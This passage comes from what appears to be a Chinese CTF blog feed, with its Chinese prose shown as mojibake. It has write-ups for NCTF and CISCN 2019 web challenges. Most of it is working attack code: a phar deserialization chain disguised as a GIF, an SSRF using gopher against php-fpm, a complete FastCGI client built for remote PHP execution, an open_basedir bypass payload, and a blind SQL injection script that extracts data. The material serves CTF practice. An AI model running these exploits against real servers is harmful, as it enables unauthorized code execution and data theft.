$this_is_a_easy_test=unserialize($_GET[&#39;careful&#39;]);        if($this_is_a_easy_test-&gt;funny_get() === &#39;1&#39;){            echo $this-&gt;curl($this-&gt;url);        }    }}@unlink(&#39;phar.phar&#39;);$p = new Phar(&#39;phar.phar&#39;, 0);$p-&gt;startBuffering();$p-&gt;setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);$o = new Main();$p-&gt;setMetadata($o);$p-&gt;addFromString(&#39;test.txt&#39;,&#39;test&#39;);$p-&gt;stopBuffering();$a = new Easytest();echo (urlencode(serialize($a)));#O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D</code></pre><p>ç”Ÿæˆçš„pharæ–‡ä»¶æ”¹åç¼€ä¸ºgif,jpegï¼Œå¯ä»¥ç»•è¿‡ä¸Šä¼ ã€‚è€Œæ‰“å°å‡ºçš„ç”¨äºè§¦å‘ssrfçš„é­”æœ¯æ–¹æ³•çš„ååºåˆ—åŒ–æ•°æ®åˆ™ä¼ åˆ°urlä¸­ã€‚ä¹‹åå†ç”¨<code>phar://</code>ä¼ªåè®®è§¦å‘ã€‚è¿™æ ·æˆ‘ä»¬å°±ç›´æ¥å†™å‡ºç”¨äºè§¦å‘pharååºåˆ—åŒ–çš„exp:</p><pre><code class="python">import requestsurl=&#39;http://290b80a5-0d25-41e3-a73d-d01107cce539.node3.buuoj.cn/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D&#39;data={    &#39;name&#39;:&#39;phar://uploads/d388a7ce2d.gif&#39;,    &#39;submit&#39;:&#39;1&#39;}r=requests.post(url,data=data)print(r.text)</code></pre><p>æ¥ä¸‹æ¥å°±æ˜¯ssrfåˆ©ç”¨äº†ï¼Œæ­¤å¤„ä¾æ—§æ˜¯æ‰“å†…ç½‘ã€‚æ¢æµ‹å®Œ<br><code>etc/hosts/</code>ç»“æœæ˜¯</p><pre><code class="bash">::1    localhost ip6-localhost ip6-loopbackfe00::0    ip6-localnetff00::0    ip6-mcastprefixff02::1    ip6-allnodesff02::2    ip6-allrouters173.0.168.9    osrc</code></pre><p>æ­¤æ—¶é¡ºç€ä¸»æœºæ¢æµ‹<code>http://173.0.168.10</code>ï¼Œå¯ä»¥å‘ç°æœ‰å›æ˜¾<br><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å­˜æ´»ä¸»æœº"><br>php-FPMè¦æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿè¿™é‡Œè¦æåˆ°pç‰›çš„æ–‡ç« ï¼š<br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>å…·ä½“pç‰›å†™çš„å¾ˆè¯¦ç»†,æˆ‘ä»¬çŸ¥é“çš„ï¼Œå°±æ˜¯å¯ä»¥ç›´æ¥æ‹¿è„šæœ¬åˆ©ç”¨è¿™ç‚¹ï¼Œä½¿ç”¨gopheråè®®ä¼ è¾“tcpæ•°æ®æ”»å‡»å†…ç½‘ï¼Œè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚<br>ä½¿ç”¨å¦‚ä¸‹è„šæœ¬</p><pre><code class="python">import socketimport randomimport argparseimport sysfrom io import BytesIOimport base64import urllib# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i])def bord(c):    if isinstance(c, int):        return c    else:        return ord(c)def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode(&#39;utf-8&#39;, &#39;strict&#39;)def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s = str(s, &#39;utf-8&#39;, &#39;strict&#39;)    else:        s = str(s)    return sclass FastCGIClient:    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;    # private    __FCGI_VERSION = 1    __FCGI_ROLE_RESPONDER = 1    __FCGI_ROLE_AUTHORIZER = 2    __FCGI_ROLE_FILTER = 3    __FCGI_TYPE_BEGIN = 1    __FCGI_TYPE_ABORT = 2    __FCGI_TYPE_END = 3    __FCGI_TYPE_PARAMS = 4    __FCGI_TYPE_STDIN = 5    __FCGI_TYPE_STDOUT = 6    __FCGI_TYPE_STDERR = 7    __FCGI_TYPE_DATA = 8    __FCGI_TYPE_GETVALUES = 9    __FCGI_TYPE_GETVALUES_RESULT = 10    __FCGI_TYPE_UNKOWNTYPE = 11    __FCGI_HEADER_SIZE = 8    # request state    FCGI_STATE_SEND = 1    FCGI_STATE_ERROR = 2    FCGI_STATE_SUCCESS = 3    def __init__(self, host, port, timeout, keepalive):        self.host = host        self.port = port        self.timeout = timeout        if keepalive:            self.keepalive = 1        else:            self.keepalive = 0        self.sock = None        self.requests = dict()    def __connect(self):        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        try:            self.sock.connect((self.host, int(self.port)))        except socket.error as msg:            self.sock.close()            self.sock = None            print(repr(msg))            return False        return True    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length = len(content)        buf = bchr(FastCGIClient.__FCGI_VERSION) \               + bchr(fcgi_type) \               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \               + bchr(requestid &amp; 0xFF) \               + bchr((length &gt;&gt; 8) &amp; 0xFF) \               + bchr(length &amp; 0xFF) \               + bchr(0) \               + bchr(0) \               + content        return buf    def __encodeNameValueParams(self, name, value):        nLen = len(name)        vLen = len(value)        record = b&#39;&#39;        if nLen &lt; 128:            record += bchr(nLen)        else:            record += bchr((nLen &gt;&gt; 24) | 0x80) \                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(nLen &amp; 0xFF)        if vLen &lt; 128:            record += bchr(vLen)        else:            record += bchr((vLen &gt;&gt; 24) | 0x80) \                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(vLen &amp; 0xFF)        return record + name + value    def __decodeFastCGIHeader(self, stream):        header = dict()        header[&#39;version&#39;] = bord(stream[0])        header[&#39;type&#39;] = bord(stream[1])        header[&#39;requestId&#39;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])        header[&#39;contentLength&#39;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])        header[&#39;paddingLength&#39;] = bord(stream[6])        header[&#39;reserved&#39;] = bord(stream[7])        return header    def __decodeFastCGIRecord(self, buffer):        header = buffer.read(int(self.__FCGI_HEADER_SIZE))        if not header:            return False        else:            record = self.__decodeFastCGIHeader(header)            record[&#39;content&#39;] = b&#39;&#39;            if &#39;contentLength&#39; in record.keys():                contentLength = int(record[&#39;contentLength&#39;])                record[&#39;content&#39;] += buffer.read(contentLength)            if &#39;paddingLength&#39; in record.keys():                skiped = buffer.read(int(record[&#39;paddingLength&#39;]))            return record    def request(self, nameValuePairs={}, post=&#39;&#39;):        if not self.__connect():            print(&#39;connect failure! please check your fasctcgi-server !!&#39;)            return        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)        self.requests[requestId] = dict()        request = b&quot;&quot;        beginFCGIRecordContent = bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord = b&#39;&#39;        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name = force_bytes(name)                value = force_bytes(value)                paramsRecord += self.__encodeNameValueParams(name, value)        if paramsRecord:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#39;&#39;, requestId)        if post:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#39;&#39;, requestId)        self.sock.send(request)        self.requests[requestId][&#39;state&#39;] = FastCGIClient.FCGI_STATE_SEND        self.requests[requestId][&#39;response&#39;] = b&#39;&#39;        return self.__waitForResponse(requestId)    def gopher(self, nameValuePairs={}, post=&#39;&#39;):        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)        self.requests[requestId] = dict()        request = b&quot;&quot;        beginFCGIRecordContent = bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord = b&#39;&#39;        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name = force_bytes(name)                value = force_bytes(value)                paramsRecord += self.__encodeNameValueParams(name, value)        if paramsRecord:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#39;&#39;, requestId)        if post:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#39;&#39;, requestId)        return request    def __waitForResponse(self, requestId):        data = b&#39;&#39;        while True:            buf = self.sock.recv(512)            if not len(buf):                break            data += buf        data = BytesIO(data)        while True:            response = self.__decodeFastCGIRecord(data)            if not response:                break            if response[&#39;type&#39;] == FastCGIClient.__FCGI_TYPE_STDOUT \                    or response[&#39;type&#39;] == FastCGIClient.__FCGI_TYPE_STDERR:                if response[&#39;type&#39;] == FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests[&#39;state&#39;] = FastCGIClient.FCGI_STATE_ERROR                if requestId == int(response[&#39;requestId&#39;]):                    self.requests[requestId][&#39;response&#39;] += response[&#39;content&#39;]            if response[&#39;type&#39;] == FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId][&#39;response&#39;]    def __repr__(self):        return &quot;fastcgi connect host:{} port:{}&quot;.format(self.host, self.port)if __name__ == &#39;__main__&#39;:    parser = argparse.ArgumentParser(description=&#39;Php-fpm code execution vulnerability client.&#39;)    parser.add_argument(&#39;host&#39;, help=&#39;Target host, such as 127.0.0.1&#39;)    parser.add_argument(&#39;file&#39;, help=&#39;A php file absolute path, such as /usr/local/lib/php/System.php&#39;)    parser.add_argument(&#39;-c&#39;, &#39;--code&#39;, help=&#39;What php code your want to execute&#39;, default=&#39;&lt;?php echo &quot;PWNed&quot;;?&gt;&#39;)    parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, help=&#39;FastCGI port&#39;, default=9000, type=int)    parser.add_argument(&#39;-e&#39;, &#39;--ext&#39;, help=&#39;ext absolute path&#39;, default=&#39;&#39;)    parser.add_argument(&#39;-if&#39;, &#39;--include_file&#39;, help=&#39;evil.php absolute path&#39;, default=&#39;&#39;)    parser.add_argument(&#39;-u&#39;, &#39;--url_format&#39;, help=&#39;generate gopher stream in url format&#39;, nargs=&#39;?&#39;,const=1)    parser.add_argument(&#39;-b&#39;, &#39;--base64_format&#39;, help=&#39;generate gopher stream in base64 format&#39;, nargs=&#39;?&#39;,const=1)    args = parser.parse_args()    client = FastCGIClient(args.host, args.port, 3, 0)    params = dict()    documentRoot = &quot;/&quot;    uri = args.file    params = {        &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;,        &#39;REQUEST_METHOD&#39;: &#39;POST&#39;,        &#39;SCRIPT_FILENAME&#39;: documentRoot + uri.lstrip(&#39;/&#39;),        &#39;SCRIPT_NAME&#39;: uri,        &#39;QUERY_STRING&#39;: &#39;&#39;,        &#39;REQUEST_URI&#39;: uri,        &#39;DOCUMENT_ROOT&#39;: documentRoot,        &#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;,        &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,        &#39;REMOTE_PORT&#39;: &#39;9985&#39;,        &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,        &#39;SERVER_PORT&#39;: &#39;80&#39;,        &#39;SERVER_NAME&#39;: &quot;localhost&quot;,        &#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39;,        &#39;CONTENT_TYPE&#39;: &#39;application/text&#39;,        &#39;CONTENT_LENGTH&#39;: &quot;%d&quot; % len(args.code),        &#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;,        &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On&#39;    }    if args.ext and args.include_file:        #params[&#39;PHP_ADMIN_VALUE&#39;]=&#39;extension = &#39;+args.ext        params[&#39;PHP_ADMIN_VALUE&#39;]=&quot;extension_dir = /var/www/html\nextension = ant.so&quot;        params[&#39;PHP_VALUE&#39;]=&#39;auto_prepend_file = &#39;+args.include_file    if not args.url_format and not args.base64_format :        response = client.request(params, args.code)        print(force_text(response))    else:        response = client.gopher(params, args.code)        if args.url_format:            print(urllib.quote(response))        if args.base64_format:            print(base64.b64encode(response))</code></pre><p>è°ƒç”¨æ—¶ï¼Œä¾æ®ä¸»æœºipä¿®æ”¹å‚æ•°ï¼š</p><pre><code>python exp.py 173.0.168.10 /var/www/html/index.php -p 9000 -c &lt;?php phpinfo();?&gt; -u </code></pre><p><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="exp"><br>ç”Ÿæˆçš„æ•°æ®æµæˆ‘ä»¬å†åº¦ç”Ÿæˆpharæ–‡ä»¶</p><pre><code class="php">&lt;?phpclass Main {    public $url=&quot;gopher://173.0.168.10:9000/_%01%01%B4U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%B4U%01%DC%00%00%0E%03CONTENT_LENGTH172%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%B4U%00%00%00%00%01%05%B4U%00%AC%00%00%3C%3Fphp%20mkdir%28%27byc%27%29%3Bchdir%28%27byc%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Becho%28file_get_contents%28%27flag%27%29%29%3B%20%3F%3E%01%05%B4U%00%00%00%00&quot;;}@unlink(&#39;phar.phar&#39;);$p = new Phar(&#39;phar.phar&#39;);$p-&gt;startBuffering();$p-&gt;setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);$o=new Main();$p-&gt;setMetadata($o);$p-&gt;addFromString(&#39;test.txt&#39;,&#39;test&#39;);$p-&gt;stopBuffering();</code></pre><p>è¿™é‡Œè‡ªå·±å¼€å§‹çŠ¯äº†ä¸ªå¤§é”™ï¼Œæ²¡æœ‰ç»™å…¶å¸¦ä¸Š9000ç«¯å£.å¦åˆ™æˆ‘ä»¬çš„gopheræ•°æ®æ˜¯å‘ç»™80ç«¯å£çš„ã€‚è€Œå®é™…ä¸Šï¼Œæˆ‘ä»¬è¦æ‰“çš„æ˜¯ç›‘å¬9000ç«¯å£çš„FPMã€‚æ‰€ä»¥æ³¨æ„paylaodæ ¼å¼çš„ç«¯å£ä¸ä¸‹åˆ’çº¿ã€‚<br>ä¹‹åçœ‹åˆ°<code>phpinfo()</code>ä¼šå‘ç°åˆç¦æ‰äº†ç³»ç»Ÿå‡½æ•°ã€‚ä½†æ˜¯ä¸»è¦çš„è¦ç‚¹åœ¨äº<code>bypass open_basedir</code>ã€‚å¦åˆ™æˆ‘ä»¬çš„è¡ŒåŠ¨ä¼šè¢«é™åˆ¶åœ¨è¿™å±‚ç›®å½•ã€‚<br>è€ƒè™‘ç›®å½•é€»è¾‘</p><pre><code>/flag/var/www/html/index.php</code></pre><p>ç›´æ¥æ„é€ payloadï¼š</p><pre><code class="php">mkdir(&#39;byc&#39;);chdir(&#39;byc&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;flag&#39;));</code></pre><p>åˆ°æ ¹ç›®å½•å°±å¯ä»¥æ‹¿flagäº†ã€‚<br><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN-2019-webéƒ¨åˆ†å¤ç°</title>
      <link href="2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>åŸæ¥å›½èµ›å°±æ˜¯CISCNâ€¦â€¦buuojä¸Šé¢˜ç›®æŒºå…¨çš„ï¼Œå¹²è„†é€‰ä¸€äº›æ¯”è¾ƒæœ‰ä»·å€¼çš„é¢˜ç›®å¤ç°ä¸‹ï¼š</p><h1 id="Hack-World-ç›²æ³¨"><a href="#Hack-World-ç›²æ³¨" class="headerlink" title="Hack World(ç›²æ³¨)"></a>Hack World(ç›²æ³¨)</h1><p>ç®€å•çš„å¸ƒå°”ç›²æ³¨é¢˜ï¼Œç®€å•FUZZä¸€ä¸‹å‘ç°æ˜¯æ•°å€¼å‹æ³¨å…¥ã€‚åŒæ—¶è¿‡æ»¤äº†<code>andï¼Œorï¼Œunion</code>ç©ºæ ¼ç­‰ç­‰ã€‚å›æ˜¾å¯ä»¥åˆ¤æ–­æ­£è¯¯ï¼Œè€ƒè™‘æ˜¯å¸ƒå°”ç›²æ³¨ã€‚payloadç›´æ¥ç”¨ifåˆ†æµå³å¯ã€‚ç©ºæ ¼å¯ä»¥<code>%0a</code>ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‹¬å·æ‹¬èµ·æ¥(ä¹‹å‰æ€»ç»“è¿‡)</p><a id="more"></a><p>expï¼š</p><pre><code class="python">import requests#flag{3de016a6-fb79-4b56-a2fb-ea24bc26083f}url=&#39;http://18733385-8c1b-4df7-88f0-1fb70bb6c05b.node3.buuoj.cn/index.php&#39;flag=&#39;&#39;for i in range(1,50):    print(i)    a=0    for j in range(32,128):        payload=&quot;if(ascii(substr((select%0aflag%0afrom%0aflag),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,1,2)&quot;        data = {            &#39;id&#39;: payload        }        res=requests.post(url,data=data)        if &#39;Hello&#39; in res.text:            flag+=chr(j)            print(flag)            a=1            break    if a==0:        break</code></pre><h1 id="Dropbox-pharååºåˆ—åŒ–"><a href="#Dropbox-pharååºåˆ—åŒ–" class="headerlink" title="Dropbox(pharååºåˆ—åŒ–)"></a>Dropbox(pharååºåˆ—åŒ–)</h1><p>é¢˜ç›®å±äºphpååºåˆ—åŒ–ã€‚æ„Ÿè§‰å›½èµ›çš„é¢˜ç›®ç¡®å®è´¨é‡å¾ˆé«˜ï¼Œè¿™é‡Œçš„ååºåˆ—åŒ–åˆ©ç”¨çœ‹äº†æºç ä¸å°‘æ—¶é—´æ‰æ‰¾å‡ºåˆ©ç”¨ã€‚èµ¶ç´§è®°å½•ä¸‹ã€‚<br>é¦–å…ˆè¿›æ¥æ³¨å†Œè´¦å·ç™»é™†ã€‚å‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚é¡ºæ‰‹ä¼ ä¸ªä¸€å¥è¯å›¾ç‰‡é©¬ï¼Œå‘ç°æ²¡æœ‰è¿‡æ»¤ã€‚ç„¶åæä¾›äº†å¯¹å›¾ç‰‡çš„ä¸‹è½½ä¸åˆ é™¤åŠŸèƒ½ã€‚æ­¤æ—¶ä¾æ¬¡å°è¯•ä¸€ä¸‹ï¼Œå‘ç°ä¸‹è½½åŠŸèƒ½çš„<code>filename</code>å…è®¸ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œäºæ˜¯ç›´æ¥æ‹¿åˆ°index.phpçš„æºç ï¼Œæ¥ç€å¯ä»¥æ‹¿åˆ°å…¶ä»–å…³é”®æºç ï¼Œå‘ç°æ˜¯phpååºåˆ—åŒ–ï¼Œå¼€å§‹å®¡è®¡ã€‚<br>index.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) {    header(&quot;Location: login.php&quot;);    die();}?&gt;&lt;?php echo $_SESSION[&#39;username&#39;]?&gt;&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION[&#39;sandbox&#39;]);$a-&gt;Name();$a-&gt;Size();?&gt;</code></pre><p>class.php</p><pre><code class="php">&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User {    public $db;    public function __construct() {        global $db;        $this-&gt;db = $db;    }    public function user_exist($username) {        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count = $stmt-&gt;num_rows;        if ($count === 0) {            return false;        }        return true;    }    public function add_user($username, $password) {        if ($this-&gt;user_exist($username)) {            return false;        }        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    }    public function verify_user($username, $password) {        if (!$this-&gt;user_exist($username)) {            return false;        }        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect === $password) {            return true;        }        return false;    }    public function __destruct() {        $this-&gt;db-&gt;close();    }}class FileList {    private $files;    private $results;    private $funcs;    public function __construct($path) {        $this-&gt;files = array();        $this-&gt;results = array();        $this-&gt;funcs = array();        $filenames = scandir($path);        $key = array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key = array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) {            $file = new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] = array();        }    }    public function __call($func, $args) {        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) {            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        }    }    public function __destruct() {        $table = &#39;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .= &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) {            $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;/th&gt;&#39;;        }        $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#39;;        $table .= &#39;&lt;/thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename =&gt; $result) {            $table .= &#39;&lt;tr&gt;&#39;;            foreach ($result as $func =&gt; $value) {                $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;;            }            $table .= &#39;&lt;td class=&quot;text-center&quot; filename=&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;Ã¤Â¸Â‹Ã¨Â½Â½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;Ã¥Âˆ Ã©Â™Â¤&lt;/a&gt;&lt;/td&gt;&#39;;            $table .= &#39;&lt;/tr&gt;&#39;;        }        echo $table;    }}class File {    public $filename;    public function open($filename) {        $this-&gt;filename = $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) {            return true;        } else {            return false;        }    }    public function name() {        return basename($this-&gt;filename);    }    public function size() {        $size = filesize($this-&gt;filename);        $units = array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;        return round($size, 2).$units[$i];    }    public function detele() {        unlink($this-&gt;filename);    }    public function close() {        return file_get_contents($this-&gt;filename);    }}?&gt;</code></pre><p>download.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) {    header(&quot;Location: login.php&quot;);    die();}if (!isset($_POST[&#39;filename&#39;])) {    die();}include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) {    Header(&quot;Content-type: application/octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));    echo $file-&gt;close();} else {    echo &quot;File not exist&quot;;}?&gt;</code></pre><p>delete.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) {    header(&quot;Location: login.php&quot;);    die();}if (!isset($_POST[&#39;filename&#39;])) {    die();}include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) {    $file-&gt;detele();    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);    echo json_encode($response);} else {    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);    echo json_encode($response);}?&gt;</code></pre><p>å®¡è®¡æºç ç¬¬ä¸€ååº”é¦–å…ˆæ˜¯sqlæ³¨å…¥ã€‚ä½†æ˜¯éšå³å‘ç°ä¸å­˜åœ¨å¯æ§å‚æ•°ï¼Œæ‰€ä»¥æ³¨å…¥æ— 